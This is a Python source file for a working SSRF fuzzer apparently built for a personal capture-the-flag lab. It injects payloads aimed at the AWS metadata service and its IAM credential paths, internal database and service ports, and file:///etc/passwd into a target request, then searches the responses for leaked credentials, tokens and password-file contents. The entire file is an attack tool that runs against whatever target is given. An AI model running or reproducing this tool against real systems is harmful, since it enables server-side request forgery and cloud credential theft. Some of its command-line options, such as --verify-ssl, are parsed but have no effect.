#!/usr/bin/env python3
"""
SSRF FUZZER - Supports HTTP & HTTPS
Usage:
  python3 hack.py -r request.txt -p HAILE -w ssrf_payloads.txt
  python3 hack.py -u "https://target.com/api/encode?url=FUZZ" -w payloads.txt
"""

import argparse
import requests
import sys
import json
import re
from urllib.parse import urlparse, parse_qs, urlencode, quote, urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
from colorama import Fore, Style, init

init(autoreset=True)

class SSRFScanner:
    def __init__(self):
        self.results = []
        self.found_ssrf = []
        
        # Default payloads if no wordlist provided
        self.default_payloads = [
            # Your lab metadata server
            "http://localhost:8081/latest/meta-data/",
            "http://localhost:8081/latest/user-data",
            "http://localhost:8081/latest/meta-data/iam/security-credentials/AdminRole",
            "http://localhost:8081/latest/meta-data/iam/security-credentials/SSHKeyRole",
            
            # AWS metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data",
            
            # Local services
            "http://127.0.0.1:22",
            "http://127.0.0.1:3306",
            "http://127.0.0.1:5432",
            "http://127.0.0.1:6379",
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",  # HTTPS port
            "http://127.0.0.1:8080",
            "http://127.0.0.1:8081",
            
            # HTTPS endpoints
            "https://localhost:443/",
            "https://127.0.0.1:443/",
            
            # File protocol
            "file:///etc/passwd",
        ]
    
    def parse_request_file(self, file_path, placeholder):
        """Parse request file and combine Host header with path - supports HTTP & HTTPS"""
        with open(file_path, 'r') as f:
            content = f.read().strip()
        
        lines = content.split('\n')
        
        # Parse request line
        method, path, http_version = lines[0].split()
        
        # Parse headers
        headers = {}
        body = None
        body_started = False
        body_lines = []
        
        for line in lines[1:]:
            if not line.strip():
                body_started = True
                continue
            
            if not body_started:
                if ': ' in line:
                    key, value = line.split(': ', 1)
                    headers[key] = value
            else:
                body_lines.append(line)
        
        if body_lines:
            body = '\n'.join(body_lines)
        
        # CRITICAL FIX: Determine scheme (HTTP/HTTPS) and build full URL
        host = headers.get('Host', 'localhost')
        
        # Determine scheme based on headers
        scheme = 'http'  # Default
        
        # Check X-Forwarded-Proto header (common in proxies)
        if headers.get('X-Forwarded-Proto') == 'https':
            scheme = 'https'
        # Check X-Forwarded-Scheme
        elif headers.get('X-Forwarded-Scheme') == 'https':
            scheme = 'https'
        # Check if Host contains https://
        elif host.startswith('https://'):
            scheme = 'https'
            host = host.replace('https://', '')
        # Check if path already has scheme
        elif path.startswith('https://'):
            # Path is already a full URL
            full_url = path
            # Extract host from path for later use
            parsed = urlparse(path)
            host = parsed.netloc
            path = parsed.path + ('?' + parsed.query if parsed.query else '')
            scheme = parsed.scheme
        elif path.startswith('http://'):
            # Path is already a full URL
            full_url = path
            parsed = urlparse(path)
            host = parsed.netloc
            path = parsed.path + ('?' + parsed.query if parsed.query else '')
            scheme = parsed.scheme
        else:
            # Build URL from parts
            # Check if host already contains scheme
            if host.startswith('http://'):
                scheme = 'http'
                host = host.replace('http://', '')
            elif host.startswith('https://'):
                scheme = 'https'
                host = host.replace('https://', '')
            
            # Build full URL
            if ':' in host and not host.endswith(']'):  # Handle IPv6 addresses
                host_parts = host.split(':')
                if len(host_parts) > 2:  # IPv6 address
                    # IPv6 addresses are enclosed in brackets
                    if not host.startswith('['):
                        host = f'[{host}]'
                else:
                    # Regular host:port
                    pass
            
            full_url = f"{scheme}://{host}{path}"
        
        # If we didn't build full_url in the else block above
        if 'full_url' not in locals():
            full_url = f"{scheme}://{host}{path}"
        
        # Clean up double slashes
        full_url = re.sub(r'(?<!:)//+', '/', full_url)
        
        print(f"{Fore.CYAN}[*] Parsed URL: {full_url}")
        print(f"{Fore.CYAN}[*] Scheme: {scheme}")
        print(f"{Fore.CYAN}[*] Host: {host}")
        print(f"{Fore.CYAN}[*] Path: {path}")
        
        return {
            'method': method,
            'original_url': full_url,
            'path': path,
            'scheme': scheme,
            'host': host,
            'http_version': http_version,
            'headers': headers,
            'body': body,
            'raw': content,
            'placeholder': placeholder
        }
    
    def parse_url_with_fuzz(self, url):
        """Parse URL with FUZZ placeholder - supports HTTP & HTTPS"""
        parsed = urlparse(url)
        
        # Determine scheme
        scheme = parsed.scheme if parsed.scheme else 'http'
        
        # Build headers
        headers = {
            'User-Agent': 'Mozilla/5.0 (SSRF-Fuzzer/1.0)',
            'Accept': '*/*',
            'Host': parsed.netloc if parsed.netloc else 'localhost'
        }
        
        return {
            'method': 'GET',
            'original_url': url,
            'scheme': scheme,
            'host': parsed.netloc,
            'headers': headers,
            'body': None,
            'placeholder': 'FUZZ'
        }
    
    def load_payloads(self, wordlist_file):
        """Load payloads from wordlist file"""
        if wordlist_file:
            with open(wordlist_file, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        else:
            return self.default_payloads
    
    def replace_placeholder(self, request_data, payload):
        """Replace placeholder with actual payload"""
        method = request_data['method']
        url = request_data['original_url']
        headers = request_data['headers'].copy()
        body = request_data['body']
        placeholder = request_data['placeholder']
        
        # Replace in URL
        if placeholder in url:
            url = url.replace(placeholder, quote(payload))
        
        # Replace in body (if exists)
        if body and placeholder in body:
            body = body.replace(placeholder, payload)
            
            # Update content-length if exists
            if 'Content-Length' in headers:
                headers['Content-Length'] = str(len(body.encode('utf-8')))
        
        return method, url, headers, body
    
    def send_request(self, method, url, headers, body, payload):
        """Send HTTP request and check for SSRF - supports HTTP & HTTPS"""
        try:
            # Remove problematic headers that requests handles automatically
            headers_copy = headers.copy()
            headers_copy.pop('Content-Length', None)  # requests calculates this
            headers_copy.pop('Accept-Encoding', None)  # Let requests handle encoding
            
            # Verify SSL for HTTPS but allow self-signed for testing
            verify_ssl = True
            if url.startswith('https://') and 'localhost' in url:
                # For local testing, we might want to allow self-signed certs
                verify_ssl = False
                import warnings
                warnings.filterwarnings('ignore', message='Unverified HTTPS request')
            
            if method.upper() == 'GET':
                response = requests.get(url, headers=headers_copy, timeout=10, 
                                       allow_redirects=False, verify=verify_ssl)
            elif method.upper() == 'POST':
                if body:
                    # Check content type
                    content_type = headers.get('Content-Type', '')
                    if 'application/json' in content_type:
                        try:
                            json_data = json.loads(body)
                            response = requests.post(url, json=json_data, headers=headers_copy, 
                                                   timeout=10, allow_redirects=False, verify=verify_ssl)
                        except json.JSONDecodeError:
                            # Fallback to regular data
                            response = requests.post(url, data=body, headers=headers_copy, 
                                                   timeout=10, allow_redirects=False, verify=verify_ssl)
                    else:
                        response = requests.post(url, data=body, headers=headers_copy, 
                                               timeout=10, allow_redirects=False, verify=verify_ssl)
                else:
                    response = requests.post(url, headers=headers_copy, timeout=10, 
                                           allow_redirects=False, verify=verify_ssl)
            else:
                response = requests.request(method, url, headers=headers_copy, data=body, 
                                          timeout=10, allow_redirects=False, verify=verify_ssl)
            
            return response, None
            
        except requests.exceptions.Timeout:
            return None, "Timeout"
        except requests.exceptions.ConnectionError:
            return None, "ConnectionError"
        except requests.exceptions.SSLError as e:
            return None, f"SSL Error: {e}"
        except Exception as e:
            return None, str(e)
    
    def detect_ssrf(self, response, payload):
        """Detect if SSRF was successful"""
        if not response:
            return False, "No response"
        
        content = response.text.lower()
        
        # SSRF indicators
        indicators = [
            # AWS/GCP/Azure metadata
            ('accesskeyid', 'AWS Credentials'),
            ('secretaccesskey', 'AWS Credentials'),
            ('token', 'Token found'),
            ('meta-data', 'Metadata service'),
            ('user-data', 'User data'),
            
            # Service banners
            ('ssh-2.0', 'SSH service'),
            ('mysql', 'MySQL service'),
            ('postgresql', 'PostgreSQL'),
            ('redis', 'Redis'),
            ('elasticsearch', 'Elasticsearch'),
            
            # File contents
            ('root:x:', '/etc/passwd file'),
            ('127.0.0.1', 'Localhost file'),
            ('localhost', 'Localhost file'),
            
            # Your lab specific
            ('flag_haile', 'FLAG FOUND!'),
            ('aws_token', 'AWS Token'),
            
            # Response patterns from your vulnerable app
            ('fetching it...', 'SSRF Detected'),
            ('file id is a url', 'SSRF Detected'),
            ('token looks like a url', 'SSRF Detected'),
            ('ssrf_warning', 'SSRF Detected'),
        ]
        
        # Check indicators
        for indicator, description in indicators:
            if indicator in content:
                return True, description
        
        # Check for URL reflection
        if payload in response.text:
            return True, "URL reflection"
        
        # Check for large responses (data exfiltration)
        if len(response.text) > 5000:
            return True, "Large response (possible data)"
        
        # Check for error messages indicating internal access
        error_indicators = ['connection refused', 'failed to connect', 'econnrefused']
        for error in error_indicators:
            if error in content:
                return True, f"Connection error: {error}"
        
        return False, "No SSRF indicators"
    
    def fuzz_request(self, request_data, payloads, threads=10):
        """Fuzz a request with multiple payloads"""
        print(f"\n{Fore.CYAN}[*] Starting SSRF fuzzing...")
        print(f"{Fore.CYAN}[*] Target URL: {request_data['original_url']}")
        print(f"{Fore.CYAN}[*] Scheme: {request_data.get('scheme', 'http')}")
        print(f"{Fore.CYAN}[*] Placeholder: {request_data['placeholder']}")
        print(f"{Fore.CYAN}[*] Payloads: {len(payloads)}")
        print(f"{Fore.CYAN}[*] Threads: {threads}")
        print(f"{Fore.CYAN}{'='*70}")
        
        vulnerable_count = 0
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            
            for i, payload in enumerate(payloads[:50]):  # Limit to 50 for testing
                method, url, headers, body = self.replace_placeholder(request_data, payload)
                
                future = executor.submit(
                    self.send_request, method, url, headers, body, payload
                )
                futures.append((future, payload, i+1))
            
            completed = 0
            for future, payload, count in futures:
                try:
                    response, error = future.result(timeout=15)
                    completed += 1
                    
                    if error:
                        print(f"{Fore.RED}[{count}/{len(payloads[:50])}] {payload[:40]}... -> Error: {error}")
                        continue
                    
                    # Detect SSRF
                    is_ssrf, reason = self.detect_ssrf(response, payload)
                    
                    if is_ssrf:
                        print(f"{Fore.GREEN}[{count}/{len(payloads[:50])}] {payload[:40]}... -> {Fore.GREEN}SSRF! {reason}")
                        print(f"     URL: {url[:80]}...")
                        print(f"     Status: {response.status_code}, Length: {len(response.text)}")
                        
                        # Save result
                        self.found_ssrf.append({
                            'payload': payload,
                            'url': url,
                            'status': response.status_code,
                            'length': len(response.text),
                            'reason': reason,
                            'response_preview': response.text[:200]
                        })
                        vulnerable_count += 1
                        
                        # Show interesting response snippets
                        if 'flag' in reason.lower() or 'credential' in reason.lower():
                            print(f"{Fore.YELLOW}     Response snippet: {response.text[:150]}")
                    else:
                        print(f"{Fore.WHITE}[{count}/{len(payloads[:50])}] {payload[:40]}... -> {response.status_code} ({len(response.text)} bytes)")
                
                except Exception as e:
                    print(f"{Fore.RED}[{count}/{len(payloads[:50])}] Error: {e}")
        
        return vulnerable_count
    
    def run(self, args):
        """Main run method"""
        print(f"{Fore.YELLOW}{'='*70}")
        print(f"{Fore.CYAN}SSRF FUZZER - Advanced Scanner (HTTP/HTTPS)")
        print(f"{Fore.YELLOW}{'='*70}")
        
        # Load payloads
        payloads = self.load_payloads(args.wordlist)
        print(f"{Fore.GREEN}[+] Loaded {len(payloads)} payloads")
        
        if args.request and args.placeholder:
            # Mode 1: Request file with placeholder
            print(f"{Fore.GREEN}[+] Mode: Request file fuzzing")
            print(f"{Fore.GREEN}[+] Request file: {args.request}")
            print(f"{Fore.GREEN}[+] Placeholder: {args.placeholder}")
            
            request_data = self.parse_request_file(args.request, args.placeholder)
            print(f"{Fore.GREEN}[+] Full URL constructed: {request_data['original_url']}")
            
        elif args.url:
            # Mode 2: Direct URL with FUZZ placeholder
            print(f"{Fore.GREEN}[+] Mode: URL fuzzing")
            print(f"{Fore.GREEN}[+] URL: {args.url}")
            
            if 'FUZZ' not in args.url:
                print(f"{Fore.YELLOW}[!] Warning: URL doesn't contain 'FUZZ' placeholder")
                print(f"{Fore.YELLOW}[!] Will append payload as parameter")
                
                # If no FUZZ, assume it's a parameter value
                if '=' in args.url:
                    # Add FUZZ after last =
                    args.url = args.url + "FUZZ"
                else:
                    # Add as query parameter
                    args.url = args.url + "?param=FUZZ"
            
            request_data = self.parse_url_with_fuzz(args.url)
            print(f"{Fore.GREEN}[+] Scheme detected: {request_data.get('scheme', 'http')}")
        
        else:
            print(f"{Fore.RED}[-] Error: Specify either -r/--request or -u/--url")
            return
        
        # Start fuzzing
        start_time = time.time()
        vulnerable_count = self.fuzz_request(request_data, payloads, args.threads)
        elapsed_time = time.time() - start_time
        
        # Print summary
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"{Fore.YELLOW}SCAN SUMMARY")
        print(f"{Fore.CYAN}{'='*70}")
        print(f"{Fore.GREEN}[+] Total payloads tested: {min(50, len(payloads))}")
        print(f"{Fore.GREEN}[+] SSRF vulnerabilities found: {vulnerable_count}")
        print(f"{Fore.GREEN}[+] Time elapsed: {elapsed_time:.2f} seconds")
        
        if vulnerable_count > 0:
            print(f"\n{Fore.YELLOW}[!] VULNERABLE ENDPOINTS FOUND:")
            for i, result in enumerate(self.found_ssrf[:5], 1):
                print(f"\n{Fore.GREEN}{i}. {result['reason']}")
                print(f"   Payload: {result['payload'][:60]}...")
                print(f"   URL: {result['url'][:80]}...")
                print(f"   Status: {result['status']}, Length: {result['length']}")
                
                if 'flag' in result['reason'].lower():
                    print(f"{Fore.RED}   FLAG FOUND! Check response for flag_haile_123")
            
            # Save results to file
            if args.output:
                with open(args.output, 'w') as f:
                    json.dump(self.found_ssrf, f, indent=2)
                print(f"\n{Fore.GREEN}[+] Results saved to {args.output}")
        else:
            print(f"\n{Fore.RED}[-] No SSRF vulnerabilities found")
            print(f"{Fore.YELLOW}[!] Try these manual tests:")
            print(f"   1. Test /api/encode endpoint")
            print(f"   2. Test /api/preview endpoint")
            print(f"   3. Test /upload endpoint (requires POST)")
            print(f"   4. Test /api/access/file endpoint")
        
        print(f"\n{Fore.CYAN}{'='*70}")

def main():
    parser = argparse.ArgumentParser(
        description='SSRF Fuzzer - Find Server-Side Request Forgery vulnerabilities (HTTP/HTTPS)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -r request.txt -p HAILE -w ssrf_payloads.txt
  %(prog)s -u "https://target.com/api/encode?url=FUZZ" -w payloads.txt
  %(prog)s -u "http://localhost:5000/api/preview?url=FUZZ" -w payloads.txt
  %(prog)s -r request.txt -p HAILE -w payloads.txt -t 20 -o results.json

HTTP/HTTPS Support:
  - Automatically detects scheme from headers
  - Supports X-Forwarded-Proto: https
  - Handles self-signed certificates for testing
  - Works with both HTTP and HTTPS endpoints
        """
    )
    
    # Input modes (mutually exclusive)
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-r', '--request', help='HTTP request file with placeholder')
    group.add_argument('-u', '--url', help='Direct URL with FUZZ placeholder')
    
    # Required arguments
    parser.add_argument('-w', '--wordlist', help='File with SSRF payloads (one per line)')
    parser.add_argument('-p', '--placeholder', help='Placeholder text in request file (e.g., HAILE)')
    
    # Optional arguments
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('-o', '--output', help='Output file for results (JSON format)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds')
    parser.add_argument('--verify-ssl', action='store_true', default=False, 
                       help='Verify SSL certificates (default: False for testing)')
    
    args = parser.parse_args()
    
    # Validate arguments
    if args.request and not args.placeholder:
        parser.error("When using -r/--request, you must specify -p/--placeholder")

    scanner = SSRFScanner()
    scanner.run(args)
    
if __name__ == "__main__":
    # Banner
    print(f"""{Fore.CYAN}
    ███████╗███████╗██████╗ ███████╗
    ██╔════╝██╔════╝██╔══██╗██╔════╝
    ███████╗███████╗██████╔╝█████╗  
    ╚════██║╚════██║██╔══██╗██╔══╝  
    ███████║███████║██║  ██║██║     
    ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝     
    {Fore.YELLOW}SSRF Fuzzer - HTTP/HTTPS Support
    {Fore.WHITE}Author: Haileok
    """)
    
    main()